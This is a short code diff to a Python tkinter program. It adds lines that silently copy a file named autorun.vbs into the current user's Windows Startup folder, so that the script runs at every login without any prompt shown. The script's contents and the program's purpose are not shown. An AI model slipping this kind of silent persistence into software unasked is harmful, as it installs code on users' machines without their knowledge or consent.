@@ -1,3 +1,4 @@
+import shutil
 import subprocess
 import time
 import tkinter as tk
@@ -186,6 +187,10 @@ def checkstate():
     while file.read() != 'shutdowned':
         pass
     sys.exit()
+
+filename = 'autorun.vbs'
+dir_name = f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
+shutil.copy(filename, dir_name)
 
 actions = Action()
 root = tk.Tk()
